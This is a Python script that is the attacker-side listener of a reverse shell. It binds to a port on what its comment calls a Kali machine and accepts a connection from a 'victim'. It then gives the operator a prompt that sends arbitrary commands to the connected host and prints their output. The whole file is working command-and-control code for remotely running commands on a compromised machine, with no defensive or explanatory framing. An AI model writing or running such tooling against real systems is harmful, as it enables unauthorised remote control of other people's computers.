import socket
import json
import base64
from pprint import pprint
from datetime import datetime

from macholib.mach_o import segment_command


def listen_on(ip, port):
    global target

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print("Listening...")
    target, address = listener.accept()
    print(f"Connection from {address} established.")

def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def server_run():

    # Communication established
    connection = receive()
    print("======= CONNECTION DETAILS =======")
    pprint(connection)
    send({
        "type": "ack",
        "server_id": "kali-server",
        "ok": True,
        "msg": "welcome — connection established"
    })

    cwd = connection["cwd"]

    print("\n++++++++++ COMMAND PROMPT ++++++++++")

    try:
        while True:
            command_input = input("[kali@victim " + cwd + "] $ ").strip()

            if command_input.lower() in {"exit", "quit"}:
                print("[*] Exiting (operator requested)")
                send({"cmd": "exit"})
                break

            data = {
                "type": "cmd",
                "cmd": command_input,
            }
            send(data)

            response_data = receive()
            cwd = response_data.get("cwd", cwd)
            print(response_data["response"])
    except KeyboardInterrupt:
        print("\n[*] Exiting (Ctrl+C)...")
    finally:
        try:
            target.close()
        except Exception:
            pass



listen_on('192.168.122.193', 4444) #Replace 10.0.2.15 with your Kali IP

server_run()
